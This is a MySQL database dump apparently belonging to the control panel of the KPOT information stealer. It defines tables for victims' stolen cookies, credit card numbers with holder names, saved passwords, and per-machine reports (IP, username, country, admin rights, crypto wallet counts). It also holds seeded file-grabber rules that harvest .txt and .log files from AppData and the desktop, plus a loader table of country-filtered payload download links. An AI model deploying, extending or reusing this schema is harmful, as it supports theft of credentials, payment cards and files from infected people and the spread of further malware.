SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";

--
-- Database: `kpot`
--

-- --------------------------------------------------------

--
-- Table structure for table `cookies`
--

CREATE TABLE `cookies` (
  `report_id` int(11) NOT NULL,
  `host` text NOT NULL,
  `count` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE INDEX report_id_host ON cookies(report_id, host(150));

-- --------------------------------------------------------

--
-- Table structure for table `credit_cards`
--

CREATE TABLE `credit_cards` (
  `rep_id` int(11) NOT NULL,
  `guid` varchar(100) DEFAULT NULL,
  `card_number` varchar(50) NOT NULL,
  `exp_date` varchar(10) NOT NULL,
  `holder_name` varchar(250) NOT NULL,
  `network` varchar(100) DEFAULT NULL,
  `bank_name` varchar(250) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `filegrabber`
--

CREATE TABLE `filegrabber` (
  `name` varchar(250) NOT NULL,
  `mask` varchar(1024) NOT NULL,
  `exclude_mask` varchar(1024) NOT NULL,
  `path` varchar(260) NOT NULL,
  `exclude_dirs` text,
  `min_size` int(11) NOT NULL DEFAULT '0',
  `max_size` int(11) NOT NULL DEFAULT '0',
  `all_users` tinyint(4) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `filegrabber`
--

INSERT INTO `filegrabber` (`name`, `mask`, `exclude_mask`, `path`, `exclude_dirs`, `min_size`, `max_size`, `all_users`) VALUES
('appdata', '*.log,*.txt', '', '%appdata%', '', 0, 2000, 0),
('desktop_files', '*.txt', '', '%userprofile%\\Desktop', '%userprofile%\\Desktop\\x64dbg', 0, 5192, 0);

-- --------------------------------------------------------

--
-- Table structure for table `loader`
--

CREATE TABLE `loader` (
  `link` varchar(260) NOT NULL,
  `name` varchar(250) NOT NULL,
  `countries` varchar(1024) DEFAULT NULL,
  `exclude_countries` varchar(1024) DEFAULT NULL,
  `filter_links` text,
  `has_pwd` tinyint(4) NOT NULL,
  `has_history` tinyint(4) NOT NULL,
  `has_cookie` tinyint(4) NOT NULL,
  `has_crypto` tinyint(4) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `passwords`
--

CREATE TABLE `passwords` (
  `report_id` int(11) NOT NULL,
  `soft_type` int(11) NOT NULL,
  `soft_name` varchar(250) NOT NULL,
  `host` varchar(260) NOT NULL,
  `user` text NOT NULL,
  `password` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `reports`
--

CREATE TABLE `reports` (
  `rep_id` int(11) NOT NULL,
  `os_version` int(11) NOT NULL,
  `os_name` varchar(100) NOT NULL,
  `guid` varchar(30) NOT NULL,
  `ip` varchar(25) NOT NULL,
  `admin` tinyint(1) NOT NULL,
  `favourite` tinyint(1) NOT NULL DEFAULT '0',
  `il` tinyint(1) NOT NULL,
  `timestamp` int(11) NOT NULL,
  `country_code` varchar(10) NOT NULL,
  `country` varchar(250) NOT NULL,
  `pcname` varchar(50) NOT NULL,
  `username` varchar(300) NOT NULL,
  `btc_count` int(11) NOT NULL,
  `cc_count` int(11) NOT NULL,
  `pwd_count` int(11) NOT NULL,
  `files_count` int(11) NOT NULL,
  `comment` text,
  `checked` tinyint(1) NOT NULL DEFAULT '0',
  `zipname` varchar(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Indexes for dumped tables
--

--
-- Indexes for table `filegrabber`
--
ALTER TABLE `filegrabber`
  ADD UNIQUE KEY `name` (`name`);

--
-- Indexes for table `loader`
--
ALTER TABLE `loader`
  ADD UNIQUE KEY `name` (`name`);

--
-- Indexes for table `reports`
--
ALTER TABLE `reports`
  ADD UNIQUE KEY `ID` (`rep_id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `reports`
--
ALTER TABLE `reports`
  MODIFY `rep_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
COMMIT;